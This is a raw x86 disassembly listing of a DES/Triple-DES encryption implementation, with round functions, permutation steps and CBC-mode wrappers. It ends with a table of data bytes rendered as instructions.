mov eax [ ecx + 0x68 ]
xor ebx ebx
mov edx [ ecx + 0x6c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x70 ]
xor ebx ebx
mov edx [ ecx + 0x74 ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x78 ]
xor ebx ebx
mov edx [ ecx + 0x7c ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
add esp 0x4
retn
sub_4303a0
push ecx
mov eax [ ecx + 0x78 ]
xor ebx ebx
mov edx [ ecx + 0x7c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x70 ]
xor ebx ebx
mov edx [ ecx + 0x74 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x68 ]
xor ebx ebx
mov edx [ ecx + 0x6c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x60 ]
xor ebx ebx
mov edx [ ecx + 0x64 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x58 ]
xor ebx ebx
mov edx [ ecx + 0x5c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x50 ]
xor ebx ebx
mov edx [ ecx + 0x54 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x48 ]
xor ebx ebx
mov edx [ ecx + 0x4c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x40 ]
xor ebx ebx
mov edx [ ecx + 0x44 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x38 ]
xor ebx ebx
mov edx [ ecx + 0x3c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x30 ]
xor ebx ebx
mov edx [ ecx + 0x34 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x28 ]
xor ebx ebx
mov edx [ ecx + 0x2c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x20 ]
xor ebx ebx
mov edx [ ecx + 0x24 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x18 ]
xor ebx ebx
mov edx [ ecx + 0x1c ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x10 ]
xor ebx ebx
mov edx [ ecx + 0x14 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov edx [ ecx + 0xc ]
xor eax esi
xor ecx ecx
xor edx esi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor edi [ ebp + ebx ]
mov bl dl
xor edi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor edi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor edi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor edi [ ebp + ebx + 0x600 ]
xor edi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor edi [ ebp + eax + 0x400 ]
xor edi [ ebp + edx + 0x500 ]
mov eax [ ecx ]
xor ebx ebx
mov edx [ ecx + 0x4 ]
xor eax edi
xor ecx ecx
xor edx edi
and eax 0xfcfcfcfc
and edx 0xcfcfcfcf
mov bl al
mov cl ah
ror edx 0x4
xor esi [ ebp + ebx ]
mov bl dl
xor esi [ ebp + ecx + 0x200 ]
mov cl dh
shr eax 0x10
xor esi [ ebp + ebx + 0x100 ]
mov bl ah
shr edx 0x10
xor esi [ ebp + ecx + 0x300 ]
mov cl dh
and eax 0xff
and edx 0xff
xor esi [ ebp + ebx + 0x600 ]
xor esi [ ebp + ecx + 0x700 ]
mov ecx [ esp ]
xor esi [ ebp + eax + 0x400 ]
xor esi [ ebp + edx + 0x500 ]
add esp 0x4
retn
sub_430ac0
push esi
push edi
mov esi [ esp + 0xc ]
xor ecx ecx
push ebx
push ebp
mov eax [ esi ]
mov ebx [ esp + 0x1c ]
mov edi [ esi + 0x4 ]
rol eax 0x4
mov esi eax
xor eax edi
and eax 0xf0f0f0f0
xor esi eax
xor edi eax
rol edi 0x14
mov eax edi
xor edi esi
and edi 0xfff0000f
xor eax edi
xor esi edi
rol eax 0xe
mov edi eax
xor eax esi
and eax 0x33333333
xor edi eax
xor esi eax
rol esi 0x16
mov eax esi
xor esi edi
and esi 0x3fc03fc
xor eax esi
xor edi esi
rol eax 0x9
mov esi eax
xor eax edi
and eax 0xaaaaaaaa
xor esi eax
xor edi eax
rol edi 0x1
call $+5
pop ebp
lea ebp [ ebp + 0x7d4 ]
mov ecx [ esp + 0x18 ]
cmp ebx 0x0
je r-xdata
call sub_4303a0
call sub_42fc80
jmp r-xdata
mov edx [ esp + 0x14 ]
ror esi 0x1
mov eax edi
xor edi esi
and edi 0xaaaaaaaa
xor eax edi
xor esi edi
rol eax 0x17
mov edi eax
xor eax esi
and eax 0x3fc03fc
xor edi eax
xor esi eax
rol edi 0xa
mov eax edi
xor edi esi
and edi 0x33333333
xor eax edi
xor esi edi
rol esi 0x12
mov edi esi
xor esi eax
and esi 0xfff0000f
xor edi esi
xor eax esi
rol edi 0xc
mov esi edi
xor edi eax
and edi 0xf0f0f0f0
xor esi edi
xor eax edi
ror eax 0x4
mov [ edx ] eax
mov [ edx + 0x4 ] esi
pop ebp
pop ebx
pop edi
pop esi
retn
sub_430bc0
push esi
push edi
mov eax [ esp + 0xc ]
xor ecx ecx
push ebx
push ebp
mov esi [ eax ]
mov ebx [ esp + 0x1c ]
rol esi 0x3
mov edi [ eax + 0x4 ]
rol edi 0x3
call $+5
pop ebp
lea ebp [ ebp + 0x722 ]
mov ecx [ esp + 0x18 ]
cmp ebx 0x0
je r-xdata
call sub_4303a0
call sub_42fc80
jmp r-xdata
ror edi 0x3
mov eax [ esp + 0x14 ]
ror esi 0x3
mov [ eax ] edi
mov [ eax + 0x4 ] esi
pop ebp
pop ebx
pop edi
pop esi
retn
sub_430c20
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
sub esp 0xc
rol edi 0x4
mov edx edi
xor edi esi
and edi 0xf0f0f0f0
xor edx edi
xor esi edi
rol esi 0x14
mov edi esi
xor esi edx
and esi 0xfff0000f
xor edi esi
xor edx esi
rol edi 0xe
mov esi edi
xor edi edx
and edi 0x33333333
xor esi edi
xor edx edi
rol edx 0x16
mov edi edx
xor edx esi
and edx 0x3fc03fc
xor edi edx
xor esi edx
rol edi 0x9
mov edx edi
xor edi esi
and edi 0xaaaaaaaa
xor edx edi
xor esi edi
ror edx 0x3
ror esi 0x2
mov [ ebx + 0x4 ] esi
mov eax [ esp + 0x24 ]
mov [ ebx ] edx
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x2c ]
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x4 ] eax
mov [ esp ] ebx
call sub_430bc0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x4 ] edi
mov [ esp ] ebx
call sub_430bc0
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x4 ] esi
mov [ esp ] ebx
call sub_430bc0
add esp 0xc
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
rol esi 0x2
rol edi 0x3
mov eax edi
xor edi esi
and edi 0xaaaaaaaa
xor eax edi
xor esi edi
rol eax 0x17
mov edi eax
xor eax esi
and eax 0x3fc03fc
xor edi eax
xor esi eax
rol edi 0xa
mov eax edi
xor edi esi
and edi 0x33333333
xor eax edi
xor esi edi
rol esi 0x12
mov edi esi
xor esi eax
and esi 0xfff0000f
xor edi esi
xor eax esi
rol edi 0xc
mov esi edi
xor edi eax
and edi 0xf0f0f0f0
xor esi edi
xor eax edi
ror eax 0x4
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_430d50
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
sub esp 0xc
rol edi 0x4
mov edx edi
xor edi esi
and edi 0xf0f0f0f0
xor edx edi
xor esi edi
rol esi 0x14
mov edi esi
xor esi edx
and esi 0xfff0000f
xor edi esi
xor edx esi
rol edi 0xe
mov esi edi
xor edi edx
and edi 0x33333333
xor esi edi
xor edx edi
rol edx 0x16
mov edi edx
xor edx esi
and edx 0x3fc03fc
xor edi edx
xor esi edx
rol edi 0x9
mov edx edi
xor edi esi
and edi 0xaaaaaaaa
xor edx edi
xor esi edi
ror edx 0x3
ror esi 0x2
mov [ ebx + 0x4 ] esi
mov esi [ esp + 0x24 ]
mov [ ebx ] edx
mov edi [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x4 ] eax
mov [ esp ] ebx
call sub_430bc0
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x4 ] edi
mov [ esp ] ebx
call sub_430bc0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x4 ] esi
mov [ esp ] ebx
call sub_430bc0
add esp 0xc
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
rol esi 0x2
rol edi 0x3
mov eax edi
xor edi esi
and edi 0xaaaaaaaa
xor eax edi
xor esi edi
rol eax 0x17
mov edi eax
xor eax esi
and eax 0x3fc03fc
xor edi eax
xor esi eax
rol edi 0xa
mov eax edi
xor edi esi
and edi 0x33333333
xor eax edi
xor esi edi
rol esi 0x12
mov edi esi
xor esi eax
and esi 0xfff0000f
xor edi esi
xor eax esi
rol edi 0xc
mov esi edi
xor edi eax
and edi 0xf0f0f0f0
xor esi edi
xor eax edi
ror eax 0x4
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_430e80
push ebp
push ebx
push esi
push edi
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x24 ]
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
push edi
push esi
push edi
push esi
mov ebx esp
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov ecx [ esp + 0x38 ]
push ecx
mov eax [ esp + 0x34 ]
push eax
push ebx
cmp ecx 0x0
je r-xdata
and ebp 0xfffffff8
mov eax [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
je r-xdata
and ebp 0xfffffff8
mov eax [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
je r-xdata
mov ebp [ esp + 0x38 ]
and ebp 0x7
je r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ebx
call sub_430ac0
mov eax [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
xor ecx eax
xor edx ebx
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ebx
add esi 0x8
add edi 0x8
sub ebp 0x8
jne r-xdata
mov ebp [ esp + 0x38 ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
xor eax ecx
xor ebx edx
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ebx
call sub_430ac0
mov eax [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
add esi 0x8
add edi 0x8
sub ebp 0x8
jne r-xdata
mov ecx [ esp + 0x40 ]
add esp 0x1c
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ebx
call sub_430ac0
mov eax [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
xor ecx eax
xor edx ebx
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
ror edx 0x10
mov [ edi + 0x6 ] dl
shr edx 0x10
mov [ edi + 0x5 ] dh
mov [ edi + 0x4 ] dl
mov [ edi ] ecx
jmp r-xdata
call $+5
pop edx
lea ecx [ edx + 0x166 ]
mov ebp [ ecx + ebp * 4 ]
add ebp edx
xor ecx ecx
xor edx edx
jmp ebp
jmp r-xdata
mov dh [ esi + 0x6 ]
shl edx 0x8
mov dh [ esi + 0x5 ]
mov dl [ esi + 0x4 ]
mov ecx [ esi ]
jmp r-xdata
mov ch [ esi + 0x2 ]
shl ecx 0x8
mov ch [ esi + 0x1 ]
mov cl [ esi ]
xor eax ecx
xor ebx edx
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ebx
call sub_430ac0
mov eax [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
jmp r-xdata
sub_431022
ror ecx 0x10
mov [ edi + 0x2 ] cl
shl ecx 0x10
mov [ esi + 0x1 ] ch
mov [ esi ] cl
jmp r-xdata
mov ecx [ esp + 0x40 ]
add esp 0x1c
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4310c0
push ebp
push ebx
push esi
push edi
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x2c ]
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
push edi
push esi
push edi
push esi
mov ebx esp
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x38 ]
push eax
mov eax [ esp + 0x38 ]
push eax
mov eax [ esp + 0x38 ]
push eax
push ebx
cmp ecx 0x0
je r-xdata
and ebp 0xfffffff8
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
je r-xdata
and ebp 0xfffffff8
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
je r-xdata
mov ebp [ esp + 0x3c ]
and ebp 0x7
je r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_430d50
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
xor ecx eax
xor edx ebx
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ebx
add esi 0x8
add edi 0x8
sub ebp 0x8
jne r-xdata
mov ebp [ esp + 0x3c ]
and ebp 0x7
je r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
xor eax ecx
xor ebx edx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_430c20
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
add esi 0x8
add edi 0x8
sub ebp 0x8
jne r-xdata
mov ecx [ esp + 0x4c ]
add esp 0x20
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_430d50
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
xor ecx eax
xor edx ebx
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
ror edx 0x10
mov [ edi + 0x6 ] dl
shr edx 0x10
mov [ edi + 0x5 ] dh
mov [ edi + 0x4 ] dl
mov [ edi ] ecx
jmp r-xdata
call $+5
pop edx
lea ecx [ edx + 0x15d ]
mov ebp [ ecx + ebp * 4 ]
add ebp edx
xor ecx ecx
xor edx edx
jmp ebp
jmp r-xdata
mov dh [ esi + 0x6 ]
shl edx 0x8
mov dh [ esi + 0x5 ]
mov dl [ esi + 0x4 ]
mov ecx [ esi ]
jmp r-xdata
mov ch [ esi + 0x2 ]
shl ecx 0x8
mov ch [ esi + 0x1 ]
mov cl [ esi ]
xor eax ecx
xor ebx edx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_430c20
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
jmp r-xdata
sub_43126b
ror ecx 0x10
mov [ edi + 0x2 ] cl
shl ecx 0x10
mov [ esi + 0x1 ] ch
mov [ esi ] cl
jmp r-xdata
mov ecx [ esp + 0x4c ]
add esp 0x20
mov [ ecx ] eax
mov [ ecx + 0x4 ] ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_431300
add [ eax ] cl
or [ edx ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
add [ edx ] al
add cl [ eax ]
or [ edx ] al
add [ eax ] al
add [ edx ] al
add cl [ eax ]
or [ eax ] al
add al [ eax ]
or [ eax ] al
add al [ eax ]
add [ edx ] al
add cl [ eax ]
or [ eax ] al
add [ eax ] cl
or [ edx ] al
add [ eax ] al
or [ edx ] al
add cl [ eax ]
add [ eax ] al
add cl [ eax ]
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax ] cl
or [ eax ] al
add cl [ eax ]
or [ edx ] al
add [ eax ] al
or [ edx ] al
add cl [ eax ]
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add al [ eax ]
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
or [ eax ] al
add al [ eax ]
or [ edx ] al
add [ eax ] cl
add [ eax ] al
add cl [ eax ]
add [ edx ] al
add al [ eax ]
or [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl [ eax ]
or [ edx ] al
add [ eax ] cl
add [ edx ] al
add al [ eax ]
or [ eax ] al
add [ eax ] cl
or [ edx ] al
add [ eax ] al
or [ eax ] al
add cl [ eax ]
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add al [ eax ]
or [ edx ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] cl
or [ eax ] al
add al [ eax ]
add [ edx ] al
add cl [ eax ]
or [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
add [ edx ] al
add [ eax ] al
or [ edx ] al
add cl [ eax ]
or [ edx ] al
add [ eax ] cl
or [ eax ] al
add [ eax ] al
or [ edx ] al
add cl [ eax ]
add [ edx ] al
add [ eax ] al
add [ edx ] al
add cl [ eax ]
add [ eax ] al
add al [ eax ]
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
add [ edx ] al
add cl [ eax ]
add [ edx ] al
add [ eax ] cl
or [ edx ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
or [ edx ] al
add [ eax ] cl
add [ eax ] al
add cl [ eax ]
or [ eax ] al
adc [ eax + 0x4010 ] al
add [ eax ] al
add [ eax + 0x10 ] al
adc [ eax + 0x10 ] al
add [ eax ] al
inc eax
adc [ eax - 0x80000000 ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax + 0x100000 ] al
adc [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x40
adc [ eax ] al
adc [ eax ] al
add [ eax + 0x4010 ] al
adc [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] dl
add [ eax ] 0x40
adc [ eax ] al
adc [ eax ] al
add [ eax ] 0x0
adc [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] dl
add [ eax ] dl
